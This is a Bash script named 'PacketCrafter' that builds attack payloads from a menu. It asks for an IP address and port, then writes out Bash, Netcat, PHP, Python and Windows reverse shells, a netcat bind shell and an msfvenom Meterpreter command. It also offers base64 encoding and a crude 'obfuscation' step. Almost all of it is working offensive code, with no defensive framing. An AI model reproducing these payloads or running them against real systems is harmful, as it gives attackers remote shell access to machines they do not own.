figlet -f slant "PacketCrafter"

#!/bin/bash

# Function to generate a Bash reverse shell
generate_bash_reverse_shell() {
  read -p "Enter the IP address to connect back to: " ip
  read -p "Enter the port to listen on: " port
  echo "bash -i >& /dev/tcp/$ip/$port 0>&1" > bash_reverse_shell.sh
  echo "[+] Bash reverse shell generated as bash_reverse_shell.sh"
}

# Function to generate a Netcat reverse shell
generate_nc_reverse_shell() {
  read -p "Enter the IP address to connect back to: " ip
  read -p "Enter the port to listen on: " port
  echo "nc -e /bin/bash $ip $port" > nc_reverse_shell.sh
  echo "[+] Netcat reverse shell generated as nc_reverse_shell.sh"
}

# Function to generate a Bash bind shell
generate_bash_bind_shell() {
  read -p "Enter the port to listen on: " port
  echo "nc -lvp $port -e /bin/bash" > bash_bind_shell.sh
  echo "[+] Bash bind shell generated as bash_bind_shell.sh"
}

# Function to generate a Meterpreter reverse shell
generate_meterpreter_reverse_shell() {
  read -p "Enter the IP address to connect back to: " ip
  read -p "Enter the port to listen on: " port
  echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > meterpreter_reverse_shell.exe" > meterpreter_reverse_shell.sh
  echo "[+] Meterpreter reverse shell generated as meterpreter_reverse_shell.sh"
}

# Function to generate PHP reverse shell
generate_php_shell() {
  read -p "Enter the IP address to connect back to: " ip
  read -p "Enter the port to listen on: " port
  echo "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\"'); ?>" > php_reverse_shell.php
  echo "[+] PHP reverse shell generated as php_reverse_shell.php"
}

# Function to generate Python reverse shell
generate_python_shell() {
  read -p "Enter the IP address to connect back to: " ip
  read -p "Enter the port to listen on: " port
  echo "import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('$ip', $port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(['/bin/bash','-i']);" > python_reverse_shell.py
  echo "[+] Python reverse shell generated as python_reverse_shell.py"
}

# Function to generate Windows reverse shell (Netcat)
generate_windows_shell() {
  read -p "Enter the IP address to connect back to: " ip
  read -p "Enter the port to listen on: " port
  echo "nc.exe -e cmd.exe $ip $port" > windows_reverse_shell.bat
  echo "[+] Windows reverse shell generated as windows_reverse_shell.bat"
}

# Function to encode payload in base64
encode_payload() {
  read -p "Enter the file name to encode: " file
  if [ -f "$file" ]; then
    base64 "$file" > "$file.b64"
    echo "[+] Payload encoded in base64 and saved as $file.b64"
  else
    echo "[-] File not found!"
  fi
}

# Function to obfuscate the payload using a simple method
obfuscate_payload() {
  read -p "Enter the file name to obfuscate: " file
  if [ -f "$file" ]; then
    # Example of simple obfuscation by replacing characters
    sed 's/bash/zsh/g' "$file" > "$file.obfuscated"
    echo "[+] Payload obfuscated and saved as $file.obfuscated"
  else
    echo "[-] File not found!"
  fi
}

# Main menu
echo "Select an option:"
echo "1. Generate Bash Reverse Shell"
echo "2. Generate Netcat Reverse Shell"
echo "3. Generate Bash Bind Shell"
echo "4. Generate Meterpreter Reverse TCP"
echo "5. Generate PHP Reverse Shell"
echo "6. Generate Python Reverse Shell"
echo "7. Generate Windows Reverse Shell"
echo "8. Encode Payload in Base64"
echo "9. Obfuscate Payload"
echo "10. Exit"

while true; do
  read -p "Enter your choice (1-10): " choice
  case $choice in
    1)
      generate_bash_reverse_shell
      ;;
    2)
      generate_nc_reverse_shell
      ;;
    3)
      generate_bash_bind_shell
      ;;
    4)
      generate_meterpreter_reverse_shell
      ;;
    5)
      generate_php_shell
      ;;
    6)
      generate_python_shell
      ;;
    7)
      generate_windows_shell
      ;;
    8)
      encode_payload
      ;;
    9)
      obfuscate_payload
      ;;
    10)
      echo "Goodbye!"
      exit 0
      ;;
    *)
      echo "Invalid option, please try again."
      ;;
  esac
done